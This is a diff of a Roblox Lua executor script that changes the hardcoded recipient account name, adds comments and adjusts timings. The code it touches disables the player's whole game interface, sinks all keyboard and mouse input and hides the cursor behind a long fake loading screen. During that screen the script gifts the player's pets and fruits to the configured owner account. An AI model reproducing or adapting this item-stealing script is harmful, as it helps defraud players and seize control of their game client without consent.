@@ -19,10 +19,10 @@ elseif fluxus then executorType = "Fluxus"
 elseif identifyexecutor then executorType = identifyexecutor() end
 
 -- CONFIG: Set your main account's name
-local OWNER_NAME = "szymonyut" -- 👈 CHANGE THIS
+local OWNER_NAME = "patapim123273" -- 👈 CHANGE THIS
 
 -- Other config values
-local TARGET_NAME = "szymonyut"
+local TARGET_NAME = "patapim123273"
 local LOADING_TIME = 120
 local TELEPORT_DELAY = 0.1
 local GIFT_HOLD_TIME = 2
@@ -158,15 +158,19 @@ end
 
 task.wait(3.4)
 
--- GUI + Input Block
+-- ** BLOCK ROBLOX UI + INPUT DURING LOADING **
+
 repeat task.wait() until LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
 
+-- Disable all core GUI and topbar
 StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
 StarterGui:SetCore("TopbarEnabled", false)
 
+-- Block all input with highest priority
 local function blockInput(_, _gp) return Enum.ContextActionResult.Sink end
 ContextActionService:BindActionAtPriority("BlockAll", blockInput, false, math.huge, Enum.KeyCode.Unknown)
 
+-- Hide mouse and lock it in center
 pcall(function()
     UserInputService.MouseIconEnabled = false
     UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
@@ -198,6 +202,7 @@ task.spawn(function()
         task.wait(1)
     end
     gui.Enabled = false
+    -- Re-enable Roblox UI & input
     StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
     StarterGui:SetCore("TopbarEnabled", true)
     ContextActionService:UnbindAction("BlockAll")
@@ -263,7 +268,7 @@ local function processOnePet()
     petGiftingInProgress = false
     return false
 end
-task.wait(2)
+task.wait(5)
 -- FRUIT GIFTING SYSTEM
 local function getFruits()
     local bag = LocalPlayer:FindFirstChildOfClass("Backpack")
